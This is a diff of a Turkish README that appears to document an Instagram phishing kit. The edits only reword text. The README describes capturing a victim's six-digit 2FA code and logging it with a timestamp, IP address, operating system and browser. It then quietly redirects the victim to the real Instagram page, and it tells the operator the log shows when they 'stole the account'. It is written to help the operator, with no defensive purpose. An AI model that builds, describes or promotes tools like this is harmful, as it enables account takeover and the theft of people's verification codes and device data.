@@ -70,7 +70,7 @@
 
 <p align="center"><b>✔️ Kurban sadece inputun içerisine sayı değerini girebilir herhangi bir harf, nokta, virgül, tire vb giremez. ✔️</b></p>
 
-<p align="center"><b>✔️ Kurban inputun içerisine 6 sayı uzunluğunda bir değer girmediği sürece buton aktif olmayacaktır, bunun sebebi; 6 haneli doğrulama kodunu eksiksiz bir şekilde almamız. Hem de olası durumlarda olası bir yanlış yönlendirme yaşanmaması adına, + olarak veri tabanına gereksiz ve değersiz verilerin yazılmaması için. ✔️</b></p>
+<p align="center"><b>✔️ Kurban inputun içerisine 6 sayı uzunluğunda bir değer girmediği sürece buton aktif olmayacaktır, bunun sebebi; 6 haneli doğrulama kodunu eksiksiz bir şekilde almamız. Hem de olası durumlarda olası bir yanlış yönlendirme yaşanmaması adına, + olarak veri tabanında bulunan 2FA kodu tablosuna gereksiz ve değersiz verilerin yazılmaması için. ✔️</b></p>
 
 <p align="center"><b>✔️ Hesabın yok mu? Kısmında ki "Kaydol" butonuna tıklanırsa instagramın gerçek kaydol sayfasına yönlendirilir. ✔️</b></p>
 
@@ -80,7 +80,7 @@
 
 <p align="center"><b>✔️ Kurban doğrulama kodunu inputun içerisine girdiği zaman 1 saniye içerisinde instagram hesabının ana sayfasına yönlendirilir, 1 saniye içerisinde hem kurbandan alınan doğrulama kodu oluşturduğumuz veri tabanının tablolarına yazdırılır hem de kurbanın instagram hesabının ana sayfasına yönlendirilir. ✔️</b></p>
 
-<p align="center"><b>✔️ Hedef kişi verilerini gerekli inputlara girdiği vakit veri tabanının tablolarına saat, dakika, saniye, gün, ay ve yıl şeklinde kayıt edilecektir. Bu sayede hesabı ne zaman çaldığınızdan haberdar olacaksınız. ✔️</b></p>
+<p align="center"><b>✔️ Hedef kişi verilerini gerekli inputlara girdiği vakit veri tabanında bulunan tabloya saat, dakika, saniye, gün, ay ve yıl şeklinde kayıt edilecektir. Bu sayede hesabı ne zaman çaldığınızdan haberdar olacaksınız. ✔️</b></p>
 
 <p align="center"><b>✔️ Hedef kişi gerekli 6 haneli doğrulama kodu inputunu eksiksiz doldurup butona tıkladığı vakit veri tabanında bulunan tablolara IP adresi, işletim sistemi ve tarayıcı bilgileri kayıt olur. Eğer işletim sistemi ve tarayıcı bilgilerini rahat bir şekilde göremiyorsanız gerekli sütuna çift tıklayın, bu sayede rahatlıkla görebileceksiniz. ✔️</b></p>
 
